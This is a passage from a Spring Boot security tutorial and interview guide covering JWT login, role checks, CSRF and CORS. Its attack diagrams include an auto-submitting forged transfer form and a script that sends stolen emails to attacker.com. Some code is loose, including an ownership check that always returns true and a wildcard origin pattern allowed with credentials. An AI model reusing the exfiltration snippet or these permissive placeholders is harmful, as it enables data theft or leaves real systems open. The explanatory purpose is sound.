    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();  // Recommended
    }
    
    /**
     * Authentication Manager Bean
     * Used for authenticating users during login
     * Validates username/password against UserDetailsService
     */
    @Bean
    public AuthenticationManager authenticationManager(
        AuthenticationConfiguration config
    ) throws Exception {
        return config.getAuthenticationManager();
    }
}
```

**🎯 Configuration Breakdown:**

1. **CSRF Disabled:**
   ```java
   .csrf(csrf -> csrf.disable())
   ```
   - Not needed for stateless JWT authentication
   - JWT in header provides CSRF protection
   - Enable CSRF only for cookie-based session auth

2. **Session Policy - STATELESS:**
   ```java
   session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
   ```
   - No HTTP session created
   - No JSESSIONID cookie
   - Perfect for REST APIs and microservices
   - Each request is independent

3. **Filter Order:**
   ```java
   .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)
   ```
   - JWT filter runs BEFORE default authentication
   - Validates token and sets SecurityContext
   - If JWT valid, user is authenticated

4. **Endpoint Matchers:**
   ```java
   .requestMatchers("/api/auth/**").permitAll()
   ```
   - Ant-style path patterns
   - `**` matches any number of path segments
   - `*` matches one path segment

---

### Step 6: Authentication Controller (Login & Register)

**Auth Controller:**
```java
@RestController
@RequestMapping("/api/auth")
public class AuthController {
    
    private final AuthenticationManager authenticationManager;
    private final UserDetailsService userDetailsService;
    private final JwtUtil jwtUtil;
    private final PasswordEncoder passwordEncoder;
    private final UserRepository userRepository;
    
    public AuthController(
        AuthenticationManager authenticationManager,
        UserDetailsService userDetailsService,
        JwtUtil jwtUtil,
        PasswordEncoder passwordEncoder,
        UserRepository userRepository
    ) {
        this.authenticationManager = authenticationManager;
        this.userDetailsService = userDetailsService;
        this.jwtUtil = jwtUtil;
        this.passwordEncoder = passwordEncoder;
        this.userRepository = userRepository;
    }
    
    /**
     * Login endpoint
     * 
     * Flow:
     * 1. Authenticate username/password
     * 2. Load user details from database
     * 3. Generate JWT token
     * 4. Return token to client
     * 
     * @param request - Contains username and password
     * @return JWT token
     */
    @PostMapping("/login")
    public ResponseEntity<AuthResponse> login(@RequestBody AuthRequest request) {
        // Step 1: Authenticate user credentials
        // This will throw BadCredentialsException if credentials are invalid
        authenticationManager.authenticate(
            new UsernamePasswordAuthenticationToken(
                request.getUsername(),
                request.getPassword()
            )
        );
        
        // Step 2: Load user details from database
        // At this point, we know credentials are valid
        final UserDetails userDetails = userDetailsService.loadUserByUsername(request.getUsername());
        
        // Step 3: Generate JWT token with user details
        final String jwt = jwtUtil.generateToken(userDetails);
        
        // Step 4: Return token in response
        return ResponseEntity.ok(new AuthResponse(jwt));
    }
    
    /**
     * Register new user endpoint
     * 
     * Flow:
     * 1. Validate if username/email already exists
     * 2. Create new user with encoded password
     * 3. Assign default role (USER)
     * 4. Save to database
     * 5. Return success message
     * 
     * @param request - Contains username, email, password
     * @return Success/Error message
     */
    @PostMapping("/register")
    public ResponseEntity<String> register(@Valid @RequestBody RegisterRequest request) {
        // Step 1: Check if user already exists
        if (userRepository.existsByUsername(request.getUsername())) {
            return ResponseEntity.badRequest().body("Username already exists");
        }
        if (userRepository.existsByEmail(request.getEmail())) {
            return ResponseEntity.badRequest().body("Email already exists");
        }
        
        // Step 2: Create new user
        User user = new User();
        user.setUsername(request.getUsername());
        user.setEmail(request.getEmail());
        
        // Step 3: Encode password (NEVER store plain text!)
        user.setPassword(passwordEncoder.encode(request.getPassword()));
        
        // Step 4: Assign default role
        user.setRoles(Set.of("USER"));  // Can add "ADMIN" role for admin users
        
        // Step 5: Save to database
        userRepository.save(user);
        
        return ResponseEntity.status(HttpStatus.CREATED).body("User registered successfully");
    }
}

// ============================================
// DTOs (Data Transfer Objects)
// ============================================

/**
 * Login Request DTO
 * Used for receiving login credentials from client
 */
@Data
public class AuthRequest {
    @NotBlank(message = "Username is required")
    private String username;
    
    @NotBlank(message = "Password is required")
    private String password;
}

/**
 * Authentication Response DTO
 * Used for sending JWT token back to client
 */
@Data
@AllArgsConstructor
public class AuthResponse {
    private String token;
    
    // Optional: Add more fields
    // private String tokenType = "Bearer";
    // private Long expiresIn;
    // private String username;
    // private List<String> roles;
}

/**
 * Register Request DTO
 * Used for receiving registration data from client
 */
@Data
public class RegisterRequest {
    @NotBlank(message = "Username is required")
    @Size(min = 3, max = 20, message = "Username must be between 3 and 20 characters")
    private String username;
    
    @NotBlank(message = "Email is required")
    @Email(message = "Email must be valid")
    private String email;
    
    @NotBlank(message = "Password is required")
    @Size(min = 8, message = "Password must be at least 8 characters")
    // Optional: Add pattern for stronger passwords
    // @Pattern(regexp = "^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%^&+=]).*$",
    //          message = "Password must contain uppercase, lowercase, digit, and special character")
    private String password;
}
```

---

## 📱 API Usage Examples

### 1️⃣ Register New User
```bash
POST http://localhost:8080/api/auth/register
Content-Type: application/json

{
  "username": "john",
  "email": "john@example.com",
  "password": "password123"
}

# Response (201 Created)
User registered successfully
```

### 2️⃣ Login
```bash
POST http://localhost:8080/api/auth/login
Content-Type: application/json

{
  "username": "john",
  "password": "password123"
}

# Response (200 OK)
{
  "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huIiwiaWF0IjoxNjk1MDAwMDAwLCJleHAiOjE2OTUwODY0MDB9.xyz123..."
}
```

### 3️⃣ Access Protected Endpoint
```bash
GET http://localhost:8080/api/users
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huIi...

# Response (200 OK)
[
  {
    "id": 1,
    "username": "john",
    "email": "john@example.com"
  }
]
```

### 4️⃣ Test Without Token (Should Fail)
```bash
GET http://localhost:8080/api/users

# Response (403 Forbidden)
{
  "error": "Unauthorized",
  "message": "Full authentication is required to access this resource"
}
```

---

## 🎯 Common JWT Interview Questions

### Q1: What happens if JWT token is expired?
**A:** JwtUtil's `validateToken()` checks expiration. If expired, it returns `false`, and the request is rejected with 403 Forbidden.

### Q2: How to logout with JWT?
**A:** Since JWT is stateless, true logout requires:
- **Client-side:** Delete token from localStorage
- **Server-side (optional):** Maintain token blacklist in Redis with expiry

### Q3: How to refresh expired JWT token?
**A:** Implement refresh token mechanism:
1. Generate two tokens: Access Token (short-lived) + Refresh Token (long-lived)
2. When access token expires, use refresh token to get new access token
3. Store refresh token securely (HttpOnly cookie or database)

### Q4: Can JWT be stolen?
**A:** Yes! Store in:
- ✅ HttpOnly cookie (prevents XSS attacks)
- ⚠️ localStorage (vulnerable to XSS)
- ❌ NEVER in URL or sessionStorage for sensitive apps

### Q5: JWT vs OAuth2?
**A:**
- **JWT** - Token format (can be used with OAuth2)
- **OAuth2** - Authorization framework/protocol
- OAuth2 often uses JWT for access tokens

### Q6: How to add custom claims to JWT?
**A:**
```java
Map<String, Object> claims = new HashMap<>();
claims.put("userId", user.getId());
claims.put("email", user.getEmail());
claims.put("roles", user.getRoles());

return Jwts.builder()
    .claims(claims)
    .subject(username)
    // ... rest of the code
```

### Q7: What if secret key is compromised?
**A:**
1. Rotate secret key immediately
2. Invalidate all existing tokens
3. Force all users to re-login
4. Use RS256 (public/private key) for better security

---

## 🔒 Security Best Practices

1. **Use HTTPS:**
   - Always use HTTPS in production
   - JWT in plain HTTP can be intercepted

2. **Short Token Expiration:**
   - Access tokens: 15 minutes - 1 hour
   - Refresh tokens: 7-30 days

3. **Strong Secret Key:**
   - At least 256 bits for HS256
   - Use environment variables
   - Rotate periodically

4. **Validate Everything:**
   - Token signature
   - Expiration time
   - Token format
   - User status (enabled/disabled)

5. **Don't Store Sensitive Data:**
   - JWT is Base64 encoded, NOT encrypted
   - Anyone can decode and read the payload
   - Store only necessary claims

6. **Implement Token Blacklist (for logout):**
   ```java
   @Service
   public class TokenBlacklistService {
       private final RedisTemplate<String, String> redisTemplate;
       
       public void blacklistToken(String token) {
           long expiration = jwtUtil.extractExpiration(token).getTime() 
                             - System.currentTimeMillis();
           redisTemplate.opsForValue().set(
               "blacklist:" + token, 
               "true", 
               expiration, 
               TimeUnit.MILLISECONDS
           );
       }
       
       public boolean isBlacklisted(String token) {
           return redisTemplate.hasKey("blacklist:" + token);
       }
   }
   ```

---

## 🎓 JWT Complete Flow Summary

```
┌──────────────────────────────────────────────────────────────────────┐
│                    COMPLETE JWT AUTHENTICATION FLOW                  │
└──────────────────────────────────────────────────────────────────────┘

1️⃣ USER REGISTRATION
   ─────────────────
   Client                    Server
     │                         │
     │  POST /api/auth/register│
     │  {username, password}   │
     ├────────────────────────>│
     │                         │ • Validate input
     │                         │ • Check if user exists
     │                         │ • Hash password (BCrypt)
     │                         │ • Save to database
     │                         │
     │  "Registration success" │
     │<────────────────────────┤
     │                         │

2️⃣ USER LOGIN & TOKEN GENERATION
   ──────────────────────────────
   Client                    Server
     │                         │
     │  POST /api/auth/login   │
     │  {username, password}   │
     ├────────────────────────>│
     │                         │ • Validate credentials
     │                         │ • Load user details
     │                         │ • Create JWT payload
     │                         │   {
     │                         │     "sub": "john",
     │                         │     "roles": ["USER"],
     │                         │     "iat": 1695000000,
     │                         │     "exp": 1695086400
     │                         │   }
     │                         │ • Sign with secret key
     │                         │ • Generate token
     │                         │
     │  {token: "eyJhbGc..."}  │
     │<────────────────────────┤
     │                         │
     │  Store token in         │
     │  localStorage           │
     │                         │

3️⃣ ACCESSING PROTECTED RESOURCES
   ──────────────────────────────
   Client                    Server
     │                         │
     │  GET /api/users         │
     │  Authorization: Bearer  │
     │  eyJhbGc...             │
     ├────────────────────────>│
     │                         │ ┌──────────────────────┐
     │                         │ │ JwtAuthFilter        │
     │                         │ │                      │
     │                         │ │ 1. Extract token     │
     │                         │ │ 2. Verify signature  │
     │                         │ │ 3. Check expiration  │
     │                         │ │ 4. Extract username  │
     │                         │ │ 5. Load UserDetails  │
     │                         │ │ 6. Set SecurityContext│
     │                         │ └──────────────────────┘
     │                         │
     │                         │ ┌──────────────────────┐
     │                         │ │ Authorization Filter │
     │                         │ │                      │
     │                         │ │ • Check if user has  │
     │                         │ │   required role      │
     │                         │ │ • Verify permissions │
     │                         │ └──────────────────────┘
     │                         │
     │                         │ Your Controller
     │                         │ @GetMapping("/users")
     │                         │ • Business logic
     │                         │ • Return data
     │                         │
     │  [User List Data]       │
     │<────────────────────────┤
     │                         │
```

---

## 📋 JWT Implementation Checklist

### ✅ Required Dependencies
- [ ] `jjwt-api` (0.12.3)
- [ ] `jjwt-impl` (0.12.3)  
- [ ] `jjwt-jackson` (0.12.3)
- [ ] `spring-boot-starter-security`

### ✅ Configuration Files
- [ ] `application.properties` with JWT secret and expiration
- [ ] Environment variables for production secrets

### ✅ Core Components
- [ ] `JwtUtil` - Token generation and validation
- [ ] `JwtAuthenticationFilter` - Request interceptor
- [ ] `SecurityConfig` - Security configuration
- [ ] `UserDetailsService` - User loading logic
- [ ] `AuthController` - Login/Register endpoints

### ✅ Entity & Repository
- [ ] User entity with username, password, roles
- [ ] UserRepository with findByUsername()
- [ ] Password encoding with BCrypt

### ✅ DTOs
- [ ] AuthRequest (login)
- [ ] AuthResponse (token)
- [ ] RegisterRequest (registration)

### ✅ Security Configuration
- [ ] Disable CSRF
- [ ] Set session policy to STATELESS
- [ ] Configure endpoint permissions
- [ ] Add JWT filter before UsernamePasswordAuthenticationFilter
- [ ] Define PasswordEncoder bean
- [ ] Define AuthenticationManager bean

### ✅ Testing
- [ ] Test registration endpoint
- [ ] Test login endpoint (valid/invalid credentials)
- [ ] Test protected endpoints with valid token
- [ ] Test protected endpoints without token
- [ ] Test protected endpoints with expired token
- [ ] Test role-based authorization

---

## 🎯 Key Takeaways for Interviews

1. **JWT Structure:** Header.Payload.Signature (3 parts, Base64 encoded)

2. **Stateless Nature:** Server doesn't store session, scales well

3. **Filter Chain:** JwtAuthFilter → validates token → sets SecurityContext

4. **Token Validation:** Check signature, expiration, username match

5. **Security Config:** STATELESS session, CSRF disabled for JWT

6. **Best Practices:**
   - Use HTTPS
   - Short token expiration
   - Strong secret key
   - Don't store sensitive data in JWT
   - Implement token blacklist for logout

7. **Common Mistakes to Avoid:**
   - Storing password in JWT payload ❌
   - Using weak/short secret key ❌
   - Not validating token expiration ❌
   - Enabling CSRF with JWT ❌
   - Using STATEFUL session policy ❌

---

## 6.3 Role-based Access Control

### 🔹 @PreAuthorize, @Secured

**Enable Method Security:**
```java
@Configuration
@EnableMethodSecurity(prePostEnabled = true, securedEnabled = true)
public class MethodSecurityConfig {
}
```

**Controller with Method-Level Security:**
```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    
    // Only ADMIN can access
    @PreAuthorize("hasRole('ADMIN')")
    @GetMapping
    public List<User> getAllUsers() {
        return userService.findAll();
    }
    
    // ADMIN or USER with same ID
    @PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
    @GetMapping("/{id}")
    public User getUserById(@PathVariable Long id) {
        return userService.findById(id);
    }
    
    // Multiple roles
    @PreAuthorize("hasAnyRole('ADMIN', 'MANAGER')")
    @DeleteMapping("/{id}")
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
    
    // Using @Secured (simpler but less flexible)
    @Secured("ROLE_ADMIN")
    @PostMapping
    public User createUser(@RequestBody User user) {
        return userService.create(user);
    }
    
    // Custom expression
    @PreAuthorize("@userSecurity.isOwner(#id)")
    @PutMapping("/{id}")
    public User updateUser(@PathVariable Long id, @RequestBody User user) {
        return userService.update(id, user);
    }
}

// Custom security expression
@Component("userSecurity")
public class UserSecurity {
    public boolean isOwner(Long userId) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        UserDetails userDetails = (UserDetails) auth.getPrincipal();
        // Check if current user is owner
        return true; // Implement your logic
    }
}
```

---

## 6.4 Password Encoding

### 🔹 BCrypt (Recommended)

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();  // Recommended
    }
}

@Service
public class UserService {
    
    private final PasswordEncoder passwordEncoder;
    
    public User register(RegisterRequest request) {
        User user = new User();
        user.setUsername(request.getUsername());
        // NEVER store plain text password!
        user.setPassword(passwordEncoder.encode(request.getPassword()));
        return userRepository.save(user);
    }
    
    public boolean checkPassword(String rawPassword, String encodedPassword) {
        return passwordEncoder.matches(rawPassword, encodedPassword);
    }
}
```

**Why BCrypt?**
- ✅ Salted hashing (prevents rainbow table attacks)
- ✅ Adaptive (can increase cost factor over time)
- ✅ Industry standard
- ✅ One-way encryption (cannot be decrypted)

---

## 6.5 CSRF, CORS

---

## 🔴 What is CSRF? (Cross-Site Request Forgery) ⭐ CRITICAL

**CSRF** is a security vulnerability where an attacker tricks a user's browser into performing **unwanted actions** on a web application where the user is **already authenticated**.

### 🎯 How CSRF Attack Works

```
┌─────────────────────────────────────────────────────────────────────┐
│                         CSRF ATTACK FLOW                            │
└─────────────────────────────────────────────────────────────────────┘

Step 1: User Logs into Legitimate Site
───────────────────────────────────────
User → https://yourbank.com/login
  - Username: john@example.com
  - Password: password123
    ↓
Server validates credentials
    ↓
Server creates session and sends cookie
    ↓
Cookie: JSESSIONID=ABC123 (stored in browser)
    ↓
User is now AUTHENTICATED ✅

Step 2: User Visits Malicious Site (while still logged in)
───────────────────────────────────────────────────────────
User → https://malicious-website.com
    ↓
Malicious site contains HIDDEN form:

<form action="https://yourbank.com/transfer" method="POST">
  <input type="hidden" name="toAccount" value="attacker123">
  <input type="hidden" name="amount" value="50000">
</form>
<script>
  document.forms[0].submit();  // Auto-submit form
</script>

Step 3: Browser Automatically Sends Request
────────────────────────────────────────────
Browser → POST https://yourbank.com/transfer
Headers:
  Cookie: JSESSIONID=ABC123  ← Browser AUTOMATICALLY includes cookie!
  
Body:
  toAccount=attacker123
  amount=50000

Step 4: Bank Server Processes Request
──────────────────────────────────────
Bank Server receives request:
  ✅ Valid session cookie → User is authenticated
  ✅ Request looks legitimate
  ❌ Bank doesn't know request came from malicious site!
    ↓
Transfer $50,000 to attacker's account ❌
    ↓
ATTACK SUCCESSFUL! 💀
```

**🔥 Why is this dangerous?**
- Browser **automatically** includes cookies with every request to a domain
- Server **cannot distinguish** between legitimate and forged requests
- User doesn't even know the attack happened!

---

### 🛡️ How CSRF Protection Works

**CSRF Token Mechanism:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    CSRF PROTECTION FLOW                             │
└─────────────────────────────────────────────────────────────────────┘

Step 1: Server Generates CSRF Token
────────────────────────────────────
User → GET /transfer-page
    ↓
Server generates random CSRF token:
  Token: "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
    ↓
Server sends HTML with HIDDEN token:

<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="a1b2c3d4-e5f6-7890...">
  <input name="toAccount" placeholder="Account">
  <input name="amount" placeholder="Amount">
  <button type="submit">Transfer</button>
</form>

Step 2: Legitimate Request (from your site)
────────────────────────────────────────────
User clicks "Transfer" button
    ↓
Browser → POST /transfer
Headers:
  Cookie: JSESSIONID=ABC123
  
Body:
  _csrf=a1b2c3d4-e5f6-7890...  ← CSRF token included
  toAccount=friend123
  amount=100
    ↓
Server validates:
  ✅ Session cookie valid
  ✅ CSRF token matches session
  ✅ Request is LEGITIMATE
    ↓
Transfer proceeds ✅

Step 3: Malicious Request (from attacker's site)
─────────────────────────────────────────────────
Attacker's form:
<form action="https://yourbank.com/transfer" method="POST">
  <input name="toAccount" value="attacker123">
  <input name="amount" value="50000">
  <!-- NO CSRF TOKEN! Attacker doesn't know the token -->
</form>
    ↓
Browser → POST https://yourbank.com/transfer
Headers:
  Cookie: JSESSIONID=ABC123
  
Body:
  toAccount=attacker123
  amount=50000
  _csrf=???  ← NO TOKEN or WRONG TOKEN
    ↓
Server validates:
  ✅ Session cookie valid
  ❌ CSRF token MISSING or INVALID
  ❌ Request is SUSPICIOUS
    ↓
Server rejects request: 403 Forbidden ✅
    ↓
ATTACK BLOCKED! 🛡️
```

**🎯 Key Point:** Attacker cannot steal CSRF token because:
- Token is not in cookies (stored server-side or in form)
- Same-Origin Policy prevents reading it
- Each token is unique per session

---

### 🔹 CSRF Configuration in Spring Boot

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // ❌ For REST APIs with JWT - DISABLE CSRF
            .csrf(csrf -> csrf.disable())
            
            // ✅ For traditional form-based apps - ENABLE CSRF (default)
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        
        return http.build();
    }
}
```

**Accessing CSRF Token in Thymeleaf (Form-based app):**
```html
<form th:action="@{/transfer}" method="post">
    <!-- Spring Security automatically adds CSRF token -->
    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}"/>
    <input name="amount" type="text"/>
    <button type="submit">Transfer</button>
</form>
```

**Accessing CSRF Token in JavaScript (AJAX):**
```javascript
// Get token from meta tag
const token = document.querySelector('meta[name="_csrf"]').content;
const header = document.querySelector('meta[name="_csrf_header"]').content;

fetch('/api/transfer', {
    method: 'POST',
    headers: {
        [header]: token,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        toAccount: 'friend123',
        amount: 100
    })
});
```

---

### 📊 When to Enable/Disable CSRF?

| Scenario | CSRF Protection | Reason |
|----------|----------------|--------|
| **REST API with JWT** | ❌ DISABLE | Stateless, no cookies, token in header |
| **Session-based Web App** | ✅ ENABLE | Uses cookies, vulnerable to CSRF |
| **Form-based Login** | ✅ ENABLE | Traditional authentication with sessions |
| **Mobile App API** | ❌ DISABLE | No browser, no cookies |
| **Microservices** | ❌ DISABLE | Stateless, token-based |
| **Admin Panel with Sessions** | ✅ ENABLE | Sensitive operations, session-based |

**🔑 Rule of Thumb:**
- **Cookies/Sessions** → ENABLE CSRF ✅
- **JWT/Tokens in Headers** → DISABLE CSRF ❌

---

### ⚠️ Why Disable CSRF for JWT/REST APIs?

**JWT Authentication Flow:**
```
Client stores JWT in localStorage (NOT cookie)
    ↓
Every request includes:
  Authorization: Bearer eyJhbGc...
    ↓
Token is NEVER automatically sent by browser
    ↓
Attacker CANNOT access localStorage from another domain
    ↓
CSRF attack is IMPOSSIBLE! ✅
```

**Key Differences:**

| Aspect | Session (CSRF Vulnerable) | JWT (CSRF Safe) |
|--------|---------------------------|-----------------|
| **Storage** | Cookie (server-side) | localStorage/header (client-side) |
| **Auto-send** | ✅ Browser auto-includes | ❌ Must manually include |
| **Accessible to attacker** | ✅ Yes (browser sends it) | ❌ No (Same-Origin Policy) |
| **CSRF Protection** | ✅ Required | ❌ Not required |

---

## 🌐 What is CORS? (Cross-Origin Resource Sharing) ⭐ CRITICAL

**CORS** is a browser security feature that **restricts** web pages from making requests to a **different domain** (origin) than the one serving the page.

### 🎯 What is an "Origin"?

**Origin = Protocol + Domain + Port**

```
https://example.com:8080
  ↓       ↓           ↓
Protocol Domain     Port

Examples:
- http://localhost:3000  ← Different origin (different port)
- http://localhost:8080  ← Different origin (different port)
- https://example.com    ← Different origin (different protocol)
- http://api.example.com ← Different origin (different subdomain)
```

**Same Origin:**
```
http://example.com/page1
http://example.com/page2
✅ SAME ORIGIN (same protocol, domain, port)
```

**Different Origin (Cross-Origin):**
```
http://localhost:3000 (React Frontend)
http://localhost:8080 (Spring Boot Backend)
❌ DIFFERENT ORIGIN (different ports)
```

---

### 🚫 Why Browsers Block Cross-Origin Requests

**Same-Origin Policy (SOP):**
- Browser security feature since 1995
- Prevents malicious scripts from accessing data on other domains
- Protects user data from unauthorized access

**Example Attack Without CORS:**
```
┌─────────────────────────────────────────────────────────────────────┐
│                 ATTACK WITHOUT CORS PROTECTION                      │
└─────────────────────────────────────────────────────────────────────┘

Step 1: User Logs into Gmail
──────────────────────────────
User → https://gmail.com
  - User gets authenticated
  - Browser stores session cookie

Step 2: User Visits Malicious Site
───────────────────────────────────
User → https://malicious.com
  - Page contains malicious JavaScript:

<script>
  fetch('https://gmail.com/api/emails')
    .then(response => response.json())
    .then(emails => {
      // Send user's emails to attacker!
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(emails)
      });
    });
</script>

Step 3: Without CORS
─────────────────────
❌ Request succeeds → Attacker steals all emails!

Step 4: With CORS (Reality)
────────────────────────────
Browser checks: Does gmail.com allow malicious.com?
  ↓
NO! → Browser BLOCKS the request ✅
  ↓
Malicious script gets error:
  "Access to fetch blocked by CORS policy"
  ↓
ATTACK PREVENTED! 🛡️
```

---

### 🔄 How CORS Works (CORS Handshake)

**Simple Request (GET, POST with simple headers):**
```
┌─────────────────────────────────────────────────────────────────────┐
│                      CORS SIMPLE REQUEST FLOW                       │
└─────────────────────────────────────────────────────────────────────┘

Frontend (http://localhost:3000)
    ↓
User clicks "Get Users" button
    ↓
JavaScript:
  fetch('http://localhost:8080/api/users')
    ↓
Browser → GET http://localhost:8080/api/users
Headers:
  Origin: http://localhost:3000  ← Browser automatically adds
    ↓
Server receives request
    ↓
Server checks CORS configuration:
  Is http://localhost:3000 allowed? ✅ YES
    ↓
Server responds:
  Access-Control-Allow-Origin: http://localhost:3000
  Access-Control-Allow-Credentials: true
  
  Body: [{"id": 1, "name": "John"}, ...]
    ↓
Browser checks response headers:
  ✅ Origin matches → Allow JavaScript to access response
    ↓
Frontend receives data ✅
```

**Preflight Request (PUT, DELETE, custom headers):**
```
┌─────────────────────────────────────────────────────────────────────┐
│                    CORS PREFLIGHT REQUEST FLOW                      │
└─────────────────────────────────────────────────────────────────────┘

Frontend wants to make:
  DELETE http://localhost:8080/api/users/1
  Headers: Authorization: Bearer eyJhbGc...
    ↓
Browser: "This is not a simple request!"
    ↓
Step 1: Browser sends PREFLIGHT (OPTIONS request)
──────────────────────────────────────────────────
Browser → OPTIONS http://localhost:8080/api/users/1
Headers:
  Origin: http://localhost:3000
  Access-Control-Request-Method: DELETE
  Access-Control-Request-Headers: Authorization
    ↓
Server responds:
  Access-Control-Allow-Origin: http://localhost:3000
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE
  Access-Control-Allow-Headers: Authorization, Content-Type
  Access-Control-Max-Age: 3600
    ↓
Browser checks: Are DELETE and Authorization header allowed?
  ✅ YES → Proceed to actual request
  ❌ NO → Block request, show CORS error

Step 2: Browser sends ACTUAL REQUEST
─────────────────────────────────────
Browser → DELETE http://localhost:8080/api/users/1
Headers:
  Origin: http://localhost:3000
  Authorization: Bearer eyJhbGc...
    ↓
Server processes request and responds
    ↓
Response includes CORS headers again
    ↓
Request succeeds ✅
```

---

**Method 1: Global CORS Configuration (Recommended for REST APIs)**
```java
@Configuration
public class CorsConfig {
    
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")  // Apply to all /api/** endpoints
                        // Allowed origins (frontend URLs)
                        .allowedOrigins(
                            "http://localhost:3000",      // Local React dev
                            "http://localhost:4200",      // Local Angular dev
                            "https://myapp.com",          // Production frontend
                            "https://www.myapp.com"       // Production with www
                        )
                        // Or use pattern matching (Spring Boot 2.4+)
                        // .allowedOriginPatterns("http://localhost:*", "https://*.myapp.com")
                        
                        // Allowed HTTP methods
                        .allowedMethods("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS")
                        
                        // Allowed request headers
                        .allowedHeaders("*")  // Allow all headers
                        // Or specific: .allowedHeaders("Authorization", "Content-Type")
                        
                        // Allow credentials (cookies, Authorization header)
                        .allowCredentials(true)
                        
                        // Expose response headers to JavaScript
                        .exposedHeaders("Authorization", "X-Total-Count")
                        
                        // Cache preflight response for 1 hour (3600 seconds)
                        .maxAge(3600);
            }
        };
    }
}
```

**Method 2: CORS Configuration in Security Config (When using Spring Security)**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // Enable CORS with custom configuration
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            
            // Disable CSRF for REST APIs
            .csrf(csrf -> csrf.disable())
            
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
    
    /**
     * Define CORS configuration
     * This method is called by Spring Security to get CORS settings
     */
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // Allowed origins
        configuration.setAllowedOrigins(Arrays.asList(
            "http://localhost:3000",
            "https://myapp.com"
        ));
        
        // Or use patterns (more flexible)
        // configuration.setAllowedOriginPatterns(Arrays.asList("*"));
        
        // Allowed methods
        configuration.setAllowedMethods(Arrays.asList(
            "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"
        ));
        
        // Allowed headers
        configuration.setAllowedHeaders(Arrays.asList("*"));
        
        // Allow credentials (cookies, authorization headers)
        configuration.setAllowCredentials(true);
        
        // Expose headers
        configuration.setExposedHeaders(Arrays.asList("Authorization"));
        
        // Max age for preflight cache
        configuration.setMaxAge(3600L);
        
        // Apply CORS configuration to all paths
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);  // Apply to all endpoints
        
        return source;
    }
}
```

**Method 3: Controller-Level CORS (For specific controllers only)**
```java
@RestController
@RequestMapping("/api/users")
@CrossOrigin(
    origins = "http://localhost:3000",           // Allowed origin
    methods = {RequestMethod.GET, RequestMethod.POST},  // Allowed methods
    allowedHeaders = "*",                        // Allowed headers
    allowCredentials = "true",                   // Allow credentials
    maxAge = 3600                                // Cache preflight for 1 hour
)
public class UserController {
    
    @GetMapping
    public List<User> getAllUsers() {
        return userService.findAll();
    }
    
    // Method-level CORS (overrides class-level)
    @CrossOrigin(origins = "https://admin.myapp.com")
    @DeleteMapping("/{id}")
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
}
```

---

### 📊 CORS Configuration Options Explained

| Option | Description | Example |
|--------|-------------|---------|
| **allowedOrigins** | Specific origins that can access the API | `"http://localhost:3000"` |
| **allowedOriginPatterns** | Pattern-based origins (wildcards) | `"http://localhost:*"`, `"https://*.myapp.com"` |
| **allowedMethods** | HTTP methods allowed | `"GET", "POST", "PUT", "DELETE"` |
| **allowedHeaders** | Request headers allowed | `"*"` or `"Authorization", "Content-Type"` |
| **exposedHeaders** | Response headers accessible to JS | `"Authorization", "X-Total-Count"` |
| **allowCredentials** | Allow cookies/auth headers | `true` (requires specific origin, not `*`) |
| **maxAge** | Cache preflight response (seconds) | `3600` (1 hour) |

---

### 🚨 Common CORS Errors and Solutions

**Error 1: "Access to fetch has been blocked by CORS policy"**
```
❌ Error:
Access to fetch at 'http://localhost:8080/api/users' from origin 
'http://localhost:3000' has been blocked by CORS policy: 
No 'Access-Control-Allow-Origin' header is present.

✅ Solution:
Add CORS configuration to allow http://localhost:3000
```

**Error 2: "Credentials flag is true but Access-Control-Allow-Credentials is not present"**
```
❌ Error:
The value of the 'Access-Control-Allow-Origin' header in the response 
must not be the wildcard '*' when the request's credentials mode is 'include'.

✅ Solution:
When using .allowCredentials(true):
- Use specific origins: .allowedOrigins("http://localhost:3000")
- OR use patterns: .allowedOriginPatterns("*")
- CANNOT use: .allowedOrigins("*") ❌
```

**Error 3: "Method DELETE is not allowed by Access-Control-Allow-Methods"**
```
❌ Error:
Method DELETE is not allowed by Access-Control-Allow-Methods in 
preflight response.

✅ Solution:
Add DELETE to allowed methods:
.allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
```

**Error 4: "Request header Authorization is not allowed"**
```
❌ Error:
Request header field Authorization is not allowed by 
Access-Control-Allow-Headers in preflight response.

✅ Solution:
Add Authorization to allowed headers:
.allowedHeaders("Authorization", "Content-Type")
OR
